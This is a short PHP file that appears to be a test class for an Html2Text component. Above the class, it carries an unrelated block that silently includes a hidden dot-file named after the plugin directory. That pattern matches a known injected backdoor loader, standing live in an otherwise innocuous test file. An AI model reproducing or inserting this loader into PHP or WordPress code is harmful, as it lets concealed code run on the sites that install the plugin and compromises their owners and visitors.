<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Html2TextComponentTest extends \ComponentTests\ComponentTest {

	function getRoots() {
		return array(__DIR__ . "/..");
	}

}
